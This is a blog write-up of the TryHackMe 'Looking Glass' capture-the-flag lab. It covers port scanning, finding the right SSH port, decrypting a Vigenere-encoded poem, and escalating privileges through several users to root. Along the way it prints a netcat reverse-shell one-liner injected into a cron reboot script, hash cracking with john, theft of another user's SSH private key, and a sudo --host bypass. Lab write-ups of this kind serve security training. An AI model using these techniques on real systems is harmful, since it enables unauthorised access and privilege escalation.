---
layout: post
title: TryHackMe - Looking Glass
date: 2023-09-01 16:54:00 +0700
tags: [wonderland, CTF, alice, ssh]
toc: true
---

<p class="message" class="message">Step through the looking glass. A sequel to the Wonderland challenge room.</p>

## Enumeration

### Nmap Scan

```
┌──(kali㉿kali)-[~]
└─ sudo nmap -p- --min-rate 5000 -Pn LGlass.thm
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-01 02:59 EDT
Warning: 10.10.180.167 giving up on port because retransmission cap hit (10).
Nmap scan report for LGlass.thm (10.10.180.167)
Host is up (0.18s latency).
Not shown: 60534 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
9000/tcp  open  cslistener
9001/tcp  open  tor-orport
[REDACTED]
13995/tcp open  unknown
13996/tcp open  unknown
13997/tcp open  unknown
13998/tcp open  unknown
13999/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 31.83 seconds
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -Pn -p 9000-13999 LGlass.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-01 02:59 EDT
Nmap scan report for LGlass.thm (10.10.180.167)
Host is up (0.22s latency).

PORT      STATE SERVICE    VERSION
9000/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9001/tcp  open  ssh        Dropbear sshd (protocol 2.0)
9002/tcp  open  ssh        Dropbear sshd (protocol 2.0)
[REDACTED]
13997/tcp open  ssh        Dropbear sshd (protocol 2.0)
13998/tcp open  ssh        Dropbear sshd (protocol 2.0)
13999/tcp open  ssh        Dropbear sshd (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 167.62 seconds
```

### Find correct port

As you can see from the Nmap scan, the ports from **9000** → **13000** are all running **SSH** service. I try to connect the lowest one:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ssh LGlass.thm -p 9000
Unable to negotiate with 10.10.180.167 port 9000: no matching host key type found. Their offer: ssh-rsa
```

However, I got _no matching host key type found_ error at the first time. To solve this, I append my `ssh` command with `-oHostKeyAlgorithms=+ssh-rsa`:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ssh LGlass.thm -p 9000 -oHostKeyAlgorithms=+ssh-rsa
The authenticity of host '[lglass.thm]:9000 ([10.10.180.167]:9000)' can't be established.
RSA key fingerprint is SHA256:iMwNI8HsNKoZQ7O0IFs1Qt8cf0ZDq2uI8dIK97XGPj0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[lglass.thm]:9000' (RSA) to the list of known hosts.
Lower
Connection to lglass.thm closed.
```

Another way to skip inputting the `-oHostKeyAlgorithms=+ssh-rsa` and the question _Are you sure you want to continue connecting (yes/no/[fingerprint])?_ is modifying the **config** file as below:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ nano ~/.ssh/config

┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ cat ~/.ssh/config
Host LGlass.thm
        HostName 10.10.180.167
        StrictHostKeyChecking no
        HostKeyAlgorithms=+ssh-rsa
```

And the result would look like this:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ssh LGlass.thm -p 9000
Warning: Permanently added '[10.10.180.167]:9000' (RSA) to the list of known hosts.
Lower
Connection to 10.10.180.167 closed.
```

With the lowest port as `9000` in the list, the return message is **Lower** → How about the highest one?

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ssh LGlass.thm -p 13999
Warning: Permanently added '[10.10.180.167]:13999' (RSA) to the list of known hosts.
Higher
Connection to 10.10.180.167 closed.
```

Now it said **Higher**. This seems like a ‘mirror’ thing which has the opposite meaning: **Lower** → **Higher** and **Higher** → **Lower.**

Let’s break half of the port’s index and try to find out the correct port:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ssh LGlass.thm -p 11499
Warning: Permanently added '[10.10.180.167]:11499' (RSA) to the list of known hosts.
Lower
Connection to 10.10.180.167 closed.

┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ssh LGlass.thm -p 13686
Warning: Permanently added '[10.10.180.167]:13686' (RSA) to the list of known hosts.
Higher
Connection to 10.10.180.167 closed.
```

### Find the key —> ssh creds

After trying these ports, I finally find out the right one:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ssh LGlass.thm -p 13482
Warning: Permanently added '[10.10.180.167]:13482' (RSA) to the list of known hosts.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
```

<p class="message">
❗ The correct port will be changed after a few minutes and it will not be the same as the previous port even you are solving the same target’s IP address.

</p>

The challenge seems like an encoded poet by using **Vigenere Cipher**, but I don’t have a key to decode it. Luckily, this [site](https://www.guballa.de/vigenere-solver) or this [site](https://www.boxentriq.com/code-breaking/vigenere-cipher) has the ability to brute-force the message:

![Untitled](/assets/Looking%20Glass%20images/Untitled.png)

![Untitled](/assets/Looking%20Glass%20images/Untitled%201.png)

Because there are words that have their length is longer than 10 characters → Set the **Key Length** or **Max Key Length** up to **20** or higher.

![Untitled](/assets/Looking%20Glass%20images/Untitled%202.png)

![Untitled](/assets/Looking%20Glass%20images/Untitled%203.png)

If you use the [boxentriq.com](https://www.boxentriq.com/code-breaking/vigenere-cipher) to brute-force the message, please use the **encode key** to re-decode the message with another tools/pages because it’s own result on this site is formatted to lowercase but the original key contains capital characters.

Then enter the _secret_ string into the **ssh** shell and get the creds for **ssh** connection:

```
'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
jabberwock:[REDACTED]
Connection to 10.10.180.167 closed.
```

<p class="message">
❗ The password for <strong>ssh</strong> login will be changed just like the correct <strong>ssh port</strong> → If you lose the <strong>ssh shell</strong>, you need to find the correct <strong>ssh</strong> port again → enter the key → get a new password

</p>

## Gain Access

### First user

Let’s use the creds above to login to **ssh**:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ssh jabberwock@LGlass.thm
Warning: Permanently added '10.10.180.167' (ED25519) to the list of known hosts.
jabberwock@10.10.180.167's password:
Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1
jabberwock@looking-glass:~$ id
uid=1001(jabberwock) gid=1001(jabberwock) groups=1001(jabberwock)
```

List the current directory and get the first flag:

```
jabberwock@looking-glass:~$ ls -la
total 44
drwxrwxrwx 5 jabberwock jabberwock 4096 Jul  3  2020 .
drwxr-xr-x 8 root       root       4096 Jul  3  2020 ..
lrwxrwxrwx 1 root       root          9 Jul  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jabberwock jabberwock  220 Jun 30  2020 .bash_logout
-rw-r--r-- 1 jabberwock jabberwock 3771 Jun 30  2020 .bashrc
drwx------ 2 jabberwock jabberwock 4096 Jun 30  2020 .cache
drwx------ 3 jabberwock jabberwock 4096 Jun 30  2020 .gnupg
drwxrwxr-x 3 jabberwock jabberwock 4096 Jun 30  2020 .local
-rw-r--r-- 1 jabberwock jabberwock  807 Jun 30  2020 .profile
-rw-rw-r-- 1 jabberwock jabberwock  935 Jun 30  2020 poem.txt
-rwxrwxr-x 1 jabberwock jabberwock   38 Jul  3  2020 twasBrillig.sh
-rw-r--r-- 1 jabberwock jabberwock   38 Jul  3  2020 user.txt
jabberwock@looking-glass:~$ cat user.txt
[REDACTED]
```

<p class="message">
💡 [Hint]: the flag has been reversed. To read the original flag → use <strong>rev</strong>:
</p>

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ cat user.txt | rev
thm{REDACTED}
```

### Second user

Use the common technique to enumerate the escalate privilege’s information:

```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```

```
jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

Explain the above information:

- `/etc/crontab`: the bash script `twasBrillig.sh` would be automatically execute as **tweedledum**’s permission everytime the system reboot
- `sudo -l`: the current user **jabberwock** has the permission to reboot the system as **root** user

Therefore, I could inject the `twasBrilligh.sh` with my own reverse shell:

```
jabberwock@looking-glass:~$ cat twasBrillig.sh
#!/bin/bash
wall $(cat /home/jabberwock/poem.txt)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.63.75 1234 >/tmp/f
```

<p class="message">
💡 The line starts with <strong>wall</strong> is the original script.

</p>

I start a listener on my local machine. Then I reboot the system and wait for a while:

```
jabberwock@looking-glass:~$ sudo /sbin/reboot
Connection to 10.10.180.167 closed by remote host.
Connection to 10.10.180.167 closed.
```

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.180.167] 59302
/bin/sh: 0: can't access tty; job control turned off
$ whoami
tweedledum
$ id
uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
```

### Third user

I list the current directory:

```
$ ls -l
total 8
-rw-r--r-- 1 root root 520 Jul  3  2020 humptydumpty.txt
-rw-r--r-- 1 root root 296 Jul  3  2020 poem.txt
```

The `poem.txt` is just an useless note file, just like the previous one found in the **jabberwock**’s directory. But the `humptydumpty.txt` contains the hashes:

```
$ cat humptydumpty.txt
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

Then I use `john` to crack the hash:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ john --show humptydumpty.txt --format=RAW-SHA256
?:maybe
?:one
?:these
?:the
?:password

5 password hashes cracked, 3 left
```

So there are totally 8 lines but only 5 hashes have been cracked. I have to use another web-tool [CrackStation](https://crackstation.net/) to crack each of them. However, the last one is not a hash-type string → I use [CyberChef](https://gchq.github.io/CyberChef) to automatically crack it:

![Untitled](/assets/Looking%20Glass%20images/Untitled%204.png)

```
the password is [REDACTED]
```

I use `ls -l` with the `/home/` directory and explore these users:

```
$ ls -l /home/
total 24
drwx--x--x 6 alice        alice        4096 Jul  3  2020 alice
drwx------ 2 humptydumpty humptydumpty 4096 Jul  3  2020 humptydumpty
drwxrwxrwx 5 jabberwock   jabberwock   4096 Sep  1 07:32 jabberwock
drwx------ 5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
drwx------ 3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
drwx------ 2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum
```

There is a directory `humptydumpty` belongs to the user `humptydumpty` and it’s name is related to the `humptydumpty.txt` file → The previous password could be used to escalate privilege to this user:

```
$ python3 -c "import pty;pty.spawn('/bin/bash')"
tweedledum@looking-glass:~$ su humptydumpty
su humptydumpty
Password: [REDACTED]

humptydumpty@looking-glass:/home/tweedledum$ id
id
uid=1004(humptydumpty) gid=1004(humptydumpty) groups=1004(humptydumpty)
```

### Fourth user

Review the `/home/` directory and notice at the `alice` directory with an unusual set permissions `x`:

```
humptydumpty@looking-glass:~$ ls -l /home/
ls -l /home/
total 24
drwx--x--x 6 alice        alice        4096 Jul  3  2020 alice
drwx------ 3 humptydumpty humptydumpty 4096 Sep  1 07:54 humptydumpty
drwxrwxrwx 5 jabberwock   jabberwock   4096 Sep  1 07:32 jabberwock
drwx------ 5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
drwx------ 3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
drwx------ 2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum
```

With the `x` permission setting (`drwx--x--x`), even I do not have permission to view the directory:

```
humptydumpty@looking-glass:/home/alice$ ls -la
ls -la
ls: cannot open directory '.': Permission denied
```

I could read the file(s) inside it, for example:

```
humptydumpty@looking-glass:/home/alice$ cat .bashrc
cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

[REDACTED]

# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
humptydumpty@looking-glass:/home/alice$
```

Therefore, I try to catch the content of **ssh** private key:

```
humptydumpty@looking-glass:/home/alice$ cat .ssh/id_rsa
cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
[REDACTED]
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

Copy the key and paste it into a key file on local machine:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ nano id_rsa_alice

┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ chmod 600 id_rsa_alice

┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ls -l id_rsa_alice
-rw------- 1 kali kali 1679 Sep  1 03:57 id_rsa_alice
```

Then use it to perform **ssh** connection as user **alice** without password requirement:

```
┌──(kali㉿kali)-[~/TryHackMe/LookingGlass]
└─$ ssh alice@LGlass.thm -i id_rsa_alice
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ id
uid=1005(alice) gid=1005(alice) groups=1005(alice)
```

### Root

Check out the `/etc/sudoers.d` directory:

```
alice@looking-glass:~$ cd /etc/sudoers.d/
alice@looking-glass:/etc/sudoers.d$ ls -la
total 24
drwxr-xr-x  2 root root 4096 Jul  3  2020 .
drwxr-xr-x 91 root root 4096 Sep  1 07:46 ..
-r--r-----  1 root root  958 Jan 18  2018 README
-r--r--r--  1 root root   49 Jul  3  2020 alice
-r--r-----  1 root root   57 Jul  3  2020 jabberwock
-r--r-----  1 root root  120 Jul  3  2020 tweedles
```

Read the file `alice`:

```
alice@looking-glass:/etc/sudoers.d$ cat alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

At the first time looking to this information, the `ssalg-gnikool` might confuse you ( I am too) and it could be misunderstanding. But when you look at it carefully, you will notice that string is the reverse of **glass-looking** which is exactly the local host name of this machine. This configuration avoid user **Alice** to execute the `sudo` command directly.

Luckily, the `sudo` command has an option with `-h` flag (or `--host`) to allow user to change the default host setting:

```
alice@looking-glass:/etc/sudoers.d$ sudo --host=ssalg-gnikool -l
sudo: unable to resolve host ssalg-gnikool
Matching Defaults entries for alice on ssalg-gnikool:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on ssalg-gnikool:
    (root) NOPASSWD: /bin/bash
```

Therefore, I can execute the `/bin/bash` binary using `sudo` within the `--host` flag:

```
alice@looking-glass:/etc/sudoers.d$ sudo --host=ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:/etc/sudoers.d# id
uid=0(root) gid=0(root) groups=0(root)
```

Navigate to `/root/` directory and get the root flag:

```
root@looking-glass:/etc/sudoers.d# cat /root/root.txt
[REDACTED]
```

Remember to reverse the output to get the original flag and submit it!

### Bonus

If you are still confusing with the above, as root user, check the others **sudoers** file to have more specific view:

```
root@looking-glass:/etc/sudoers.d# cat jabberwock
jabberwock looking-glass = (root) NOPASSWD: /sbin/reboot
```

Which is similar to:

```
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
```
